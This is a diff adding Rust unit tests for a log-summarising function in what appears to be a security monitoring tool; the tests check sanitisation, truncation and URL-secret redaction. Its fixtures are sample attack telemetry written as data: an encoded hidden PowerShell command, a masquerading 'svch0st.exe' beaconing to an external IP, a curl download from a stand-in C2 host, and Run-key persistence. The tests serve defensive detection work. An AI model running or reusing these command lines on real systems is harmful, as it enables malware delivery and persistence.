@@ -433,3 +433,180 @@ fn risk_output_envelope_prefers_scored_entity_and_keeps_rows_isolated() {
     normalize_match_events_for_query(&mut invalid, "| invalid command");
     assert_eq!(invalid[0][MATCH_ENTITY], "fallback");
 }
+
+// ---------------------------------------------------------------- event_summary (NAN-5756)
+
+#[test]
+fn summary_ocsf_process_row_reads_parent_command_line() {
+    let row = json!({
+        "process.name": "powershell.exe",
+        "process.cmd_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+        "actor.process.name": "WINWORD.EXE",
+        "message": "",
+        "source_type": "windows_sysmon",
+    });
+    assert_eq!(
+        event_summary(&row).as_deref(),
+        Some("WINWORD.EXE → powershell.exe -nop -w hidden -enc SQBFAFgA")
+    );
+}
+
+#[test]
+fn summary_names_the_image_when_the_command_line_does_not() {
+    let row = json!({ "process": { "name": "svch0st.exe", "cmd_line": "--install" } });
+    assert_eq!(event_summary(&row).as_deref(), Some("svch0st.exe: --install"));
+}
+
+#[test]
+fn summary_network_row_carries_destination_and_port() {
+    let row = json!({
+        "process.name": "svch0st.exe",
+        "dst_endpoint.ip": "185.220.101.47",
+        "dst_endpoint.port": 9001,
+        "message": "connection established",
+    });
+    assert_eq!(event_summary(&row).as_deref(), Some("svch0st.exe → 185.220.101.47:9001"));
+    // UDM columns, string port.
+    let udm = json!({ "dest_ip": "10.0.0.9", "dest_port": "443" });
+    assert_eq!(event_summary(&udm).as_deref(), Some("10.0.0.9:443"));
+}
+
+#[test]
+fn summary_ocsf_network_row_names_the_actor_process() {
+    let row = json!({
+        "actor.process.name": "svch0st.exe",
+        "dst_endpoint.ip": "185.220.101.47",
+        "dst_endpoint.port": 9001,
+    });
+    assert_eq!(event_summary(&row).as_deref(), Some("svch0st.exe → 185.220.101.47:9001"));
+}
+
+#[test]
+fn summary_dns_and_file_rows() {
+    let dns = json!({ "query.hostname": "a1b2.tunnel.example", "dst_endpoint.port": 0 });
+    assert_eq!(event_summary(&dns).as_deref(), Some("dns a1b2.tunnel.example"));
+    let file = json!({ "file.path": "C:\\Users\\a\\Invoice.docm", "activity_name": "Create" });
+    assert_eq!(event_summary(&file).as_deref(), Some("Create C:\\Users\\a\\Invoice.docm"));
+}
+
+#[test]
+fn summary_falls_back_to_message_then_label_never_to_the_source() {
+    let msg = json!({ "message": "  User alice logged on  ", "source_type": "okta" });
+    assert_eq!(event_summary(&msg).as_deref(), Some("User alice logged on"));
+    let auth = json!({ "auth_type": "password", "auth_result": "failure" });
+    assert_eq!(event_summary(&auth).as_deref(), Some("failure password authentication"));
+    // Only the source: the list already shows it, so no summary.
+    assert_eq!(event_summary(&json!({ "source_type": "okta" })), None);
+    assert_eq!(event_summary(&json!("not an object")), None);
+}
+
+#[test]
+fn summary_elides_a_long_command_line() {
+    let long = format!("cmd.exe /c {}", "A".repeat(600));
+    let s = event_summary(&json!({ "process.cmd_line": long })).unwrap();
+    assert!(s.ends_with('…'), "{s}");
+    assert!(s.chars().count() <= SUMMARY_CMD_CHARS + 1, "{}", s.chars().count());
+}
+
+#[test]
+fn semantic_label_keeps_its_source_fallback() {
+    let v = normalize(json!({ "timestamp": "2026-05-16T18:00:14Z", "source_type": "aws_cloudtrail" }));
+    assert_eq!(field(&v, MATCH_EVENT_LABEL), "aws cloudtrail event");
+}
+
+// ---------------------------------------------------------------- event_summary hardening (NAN-5756 review)
+
+#[test]
+fn summary_is_one_plain_line_without_bidi_or_control_characters() {
+    let row = json!({
+        "process.name": "cmd.exe",
+        "process.cmd_line": "cmd.exe /c copy Invoice_\u{202E}fdp.exe\r\nFORGED LINE\t\u{200B}x\u{0007}",
+        "actor.process.name": "WINWORD\u{2066}.EXE",
+    });
+    let s = event_summary(&row).unwrap();
+    assert_eq!(s, "WINWORD.EXE → cmd.exe /c copy Invoice_fdp.exe FORGED LINE x");
+    assert!(!s.chars().any(|c| c.is_control()), "{s:?}");
+
+    // A message fallback too.
+    let msg = json!({ "message": "line one\nline two\u{202E}" });
+    assert_eq!(event_summary(&msg).as_deref(), Some("line one line two"));
+    // A value that is only invisible characters is absent, not blank.
+    assert_eq!(event_summary(&json!({ "message": "\u{200B}\u{202E}\n" })), None);
+}
+
+#[test]
+fn summary_bounds_every_part_so_a_huge_field_cannot_hide_the_rest() {
+    let huge = "P".repeat(5000);
+    let row = json!({
+        "actor.process.name": huge,
+        "process.name": "Q".repeat(5000),
+        "process.cmd_line": "powershell.exe -enc AAAA",
+        "dst_endpoint.ip": "185.220.101.47",
+        "dst_endpoint.port": "9".repeat(50),
+    });
+    let s = event_summary(&row).unwrap();
+    assert!(s.chars().count() <= EVENT_SUMMARY_MAX_CHARS, "{}", s.chars().count());
+    assert!(s.contains("powershell.exe -enc AAAA"), "{s}");
+    assert!(s.contains("185.220.101.47:"), "{s}");
+
+    let long_message = json!({ "message": "m".repeat(10_000) });
+    let m = event_summary(&long_message).unwrap();
+    assert!(m.chars().count() <= 400 && m.ends_with('…'), "{}", m.chars().count());
+}
+
+#[test]
+fn summary_urls_lose_userinfo_query_and_fragment() {
+    let row = json!({ "url.url_string": "https://bob:hunter2@files.example.com/drop/a.bin?access_token=SECRET&sig=X#frag" });
+    let s = event_summary(&row).unwrap();
+    assert_eq!(s, "https://files.example.com/drop/a.bin");
+    for secret in ["hunter2", "bob", "SECRET", "sig=", "frag"] {
+        assert!(!s.contains(secret), "{secret} leaked: {s}");
+    }
+    // Unparseable (relative) URL: the same cut by hand.
+    let rel = json!({ "http_request.url.url_string": "u:p@host/x?api_key=K" });
+    assert_eq!(event_summary(&rel).as_deref(), Some("host/x"));
+    // URL arguments on a command line are redacted too.
+    let cmd = json!({ "process.cmd_line": "curl.exe -o x https://u:pw@c2.example/p?token=T" });
+    let c = event_summary(&cmd).unwrap();
+    assert_eq!(c, "curl.exe -o x https://c2.example/p");
+}
+
+#[test]
+fn summary_ocsf_file_activity_keeps_the_path_beside_the_actor() {
+    let row = json!({
+        "class_uid": 1001,
+        "activity_name": "Create",
+        "actor.process.name": "WINWORD.EXE",
+        "file.path": "C:\\Users\\a\\AppData\\Local\\Temp\\svch0st.exe",
+    });
+    assert_eq!(
+        event_summary(&row).as_deref(),
+        Some("WINWORD.EXE → Create C:\\Users\\a\\AppData\\Local\\Temp\\svch0st.exe")
+    );
+    // A command line that already names the path does not repeat it.
+    let launch = json!({ "process.cmd_line": "C:\\t\\a.exe --x", "file.path": "C:\\t\\a.exe" });
+    assert_eq!(event_summary(&launch).as_deref(), Some("C:\\t\\a.exe --x"));
+}
+
+#[test]
+fn summary_ocsf_api_auth_and_registry_rows_read_without_a_message() {
+    let api = json!({ "api.operation": "DeleteBucket", "api.service.name": "s3.amazonaws.com", "actor.user.name": "alice" });
+    assert_eq!(event_summary(&api).as_deref(), Some("s3.amazonaws.com DeleteBucket · alice"));
+    let auth = json!({ "auth_protocol": "Kerberos", "status": "Failure", "user.name": "svc_backup" });
+    assert_eq!(event_summary(&auth).as_deref(), Some("Failure Kerberos authentication · svc_backup"));
+    let reg = json!({ "activity_name": "Set", "reg_value.path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd" });
+    assert_eq!(
+        event_summary(&reg).as_deref(),
+        Some("Set HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd")
+    );
+    let activity = json!({ "activity_name": "Logon", "class_name": "Authentication" });
+    assert_eq!(event_summary(&activity).as_deref(), Some("Logon"));
+}
+
+#[test]
+fn summary_udm_dns_query_column_does_not_go_blank() {
+    assert_eq!(event_summary(&json!({ "query": "x1.tunnel.example" })).as_deref(), Some("dns x1.tunnel.example"));
+    // A nested OCSF `query` object is not read as a string.
+    let nested = json!({ "query": { "hostname": "y.example" } });
+    assert_eq!(event_summary(&nested).as_deref(), Some("dns y.example"));
+}
